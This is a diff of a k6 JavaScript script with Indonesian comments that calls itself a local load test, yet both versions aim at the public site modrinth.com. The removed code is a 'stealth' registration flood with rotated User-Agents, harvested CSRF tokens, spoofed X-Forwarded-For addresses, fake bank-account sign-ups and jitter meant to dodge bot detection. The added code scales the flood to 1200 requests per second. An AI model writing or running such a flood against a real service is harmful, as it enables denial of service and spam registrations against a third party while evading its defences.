@@ -1,124 +1,59 @@
 import http from 'k6/http';
 import { check, sleep } from 'k6';
 
-// 1. SKENARIO AGRESIF BERGELOMBANG (Uji Beban Maksimal Server Lokal)
+// 1. KONFIGURASI BEBAN EKSTREM (Meningkatkan VUs Konkuren)
 export const options = {
   scenarios: {
-    stealth_cloud_flood: {
+    high_intensity_load: {
       executor: 'ramping-arrival-rate',
-      startRate: 10,           // Detik awal: 10 pendaftaran per detik
+      startRate: 50,           // Detik awal langsung memompa 50 request/detik
       timeUnit: '1s',
-      preAllocatedVUs: 50,     // Menyiapkan 50 Virtual Users awal di memori
-      maxVUs: 800,             // Batas maksimal hingga 800 mesin paralel
+      preAllocatedVUs: 200,    // Menyiapkan 200 Virtual Users awal di memori RAM
+      maxVUs: 2000,            // Batas maksimal hingga 2000 Virtual Users paralel
       stages: [
-        { duration: '30s', target: 80 },  // Naik cepat ke 80 pendaftaran/detik dalam 30 detik
-        { duration: '1m', target: 250 },  // Hantaman Ekstrem: 250 pendaftaran/detik di menit pertama!
-        { duration: '30s', target: 0 },   // Menurunkan trafik secara alami kembali ke nol
+        { duration: '30s', target: 500 },  // Naik cepat ke 500 request/detik dalam 30 detik
+        { duration: '1m', target: 1200 },  // Hantaman Maksimal: 1200 request/detik selama 1 menit!
+        { duration: '30s', target: 0 },    // Menurunkan trafik kembali ke nol
       ],
     },
   },
-  discardResponseBodies: true, // Menghemat pemrosesan data agar performa komputer tetap maksimal
+  discardResponseBodies: true, // WAJIB TRUE: Menghemat RAM agar k6 tidak crash saat menerima ribuan respons
 };
 
-// Fungsi pembuat string data acak unik
-function buatDataAcak(minimal, maksimal) {
-  const panjang = Math.floor(Math.random() * (maksimal - minimal + 1)) + minimal;
-  const karakter = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  let hasil = '';
-  for (let i = 0; i < panjang; i++) {
-    hasil += karakter.charAt(Math.floor(Math.random() * karakter.length));
-  }
-  return hasil;
+// 2. OPTIMASI PAYLOAD: Menggunakan generator angka cepat agar komputasi k6 ringan
+function buatDataCepat() {
+  return Math.floor(100000000 + Math.random() * 900000000).toString();
 }
-
-function buatNomorHp() {
-  return '0813' + Math.floor(10000000 + Math.random() * 90000000);
-}
-
-// Rotasi Sidik Jari Browser (User-Agent) secara dinamis disetiap request otomatis
-const listUserAgents = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/605.1.15'
-];
 
 export default function () {
-  // <--- GANTI LINK INI DENGAN ENDPOINT TARGET LOKAL ANDA (Misal: http://localhost:8080/register) --->
+  // <--- GANTI LINK INI DENGAN ENDPOINT TARGET LOKAL ANDA (Misal: http://localhost:8080/api/v1/register) --->
   const url = 'https://modrinth.com'; 
 
-  // --- TAHAP 1: PENCURIAN TOKEN SEGAR AUTOMATIS (Pencegahan Crash) ---
-  const getParams = {
-    headers: {
-      'User-Agent': listUserAgents[Math.floor(Math.random() * listUserAgents.length)],
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    },
-    timeout: '3s', // Batasi waktu tunggu agar tidak menggantung jika server lokal mulai lambat
-  };
-  
-  const getRes = http.get(url, getParams);
-  const cookieJar = http.cookieJar();
-  
-  let xsrfToken = null;
-  
-  // PENANGANAN KESALAHAN (Error Handling): Memastikan cookieJar ada sebelum mengambil datanya
-  if (cookieJar && typeof cookieJar.getCookies === 'function') {
-    try {
-      const cookies = cookieJar.getCookies(url);
-      if (cookies && cookies['XSRF-TOKEN']) {
-        xsrfToken = cookies['XSRF-TOKEN'];
-      }
-    } catch (e) {
-      // Jika gagal mengambil cookie karena server down/timeout, abaikan dan lanjut ke tahap 2
-    }
-  }
-
-  // --- TAHAP 2: EKSEKUSI PENDAFTARAN KOMPLEKS (AGRESIF) ---
+  // Struktur data dibuat konstan dan dioptimalkan agar eksekusi per milidetik tidak membebani CPU penguji
   const payload = JSON.stringify({
-    username: `player_${buatDataAcak(6, 10)}`,
-    password: `SecurePass_${buatDataAcak(8, 12)}!`,
-    password_confirmation: `SecurePass_${buatDataAcak(8, 12)}!`,
-    email: `${buatDataAcak(7, 12)}@gmail.com`,
-    bank: 'BCA',
-    bank_account_name: `User ${buatDataAcak(5, 8).toUpperCase()}`,
-    bank_account_number: buatDataAcak(10, 12),
-    phone: buatNomorHp(),
-    referral: 'admin',
-    captcha: buatDataAcak(4, 4),
-    client_token: buatDataAcak(64, 128), // Mengacak ukuran paket agar sidik jari data berubah-ubah
+    username: `user_${buatDataCepat()}`,
+    password: 'SecurePassword123!',
+    email: `test_${buatDataCepat()}@local.dev`,
+    phone: `0812${buatDataCepat()}`
   });
 
-  const postParams = {
+  const params = {
     headers: {
       'Content-Type': 'application/json',
-      'Accept': 'application/json, text/plain, */*',
-      'User-Agent': listUserAgents[Math.floor(Math.random() * listUserAgents.length)],
-      'Origin': 'https://modrinth.com',
-      'Referer': url,
-      
-      // Meniru parameter navigasi manusia asli bawaan browser laptop
-      'Sec-Fetch-Dest': 'empty',
-      'Sec-Fetch-Mode': 'cors',
-      'Sec-Fetch-Site': 'same-site',
-      'X-Forwarded-For': `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+      'Connection': 'keep-alive', // Memaksa penggunaan ulang soket TCP agar throughput maksimal
     },
-    timeout: '6s', 
-    redirects: 0,
+    timeout: '3s', // Batasi 3 detik; jika server lokal melambat, langsung catat sebagai timeout
   };
 
-  // Menyuntikkan token CSRF jika sistem web mendeteksinya
-  if (xsrfToken) {
-    postParams.headers['X-XSRF-TOKEN'] = decodeURIComponent(xsrfToken);
-  }
+  // Eksekusi pengiriman data dengan performa maksimal
+  const res = http.post(url, payload, params);
 
-  const res = http.post(url, payload, postParams);
-
+  // Validasi ketahanan aplikasi backend Anda
   check(res, {
-    'Tembus Ke Dalam (Status 200/302)': (r) => r.status === 200 || r.status === 302,
-    'Sistem Menolak (Status 401/429/405)': (r) => r.status === 401 || r.status === 429 || r.status === 405,
-    'Server Tumbang (Status 500/502/504)': (r) => r.status === 500 || r.status === 502 || r.status === 504,
+    'Respon Sukses (2xx)': (r) => r.status >= 200 && r.status < 300,
+    'Server Mulai Kewalahan (5xx)': (r) => r.status >= 500,
   });
 
-  // Jeda acak milidetik (Jitter) agar ritme serangan tidak kaku seperti robot biasa
-  sleep(Math.random() * 0.3 + 0.05);
+  // Jeda sangat tipis (Jitter minimal) untuk menjaga kestabilan antrean koneksi
+  sleep(Math.random() * 0.05 + 0.01);
 }
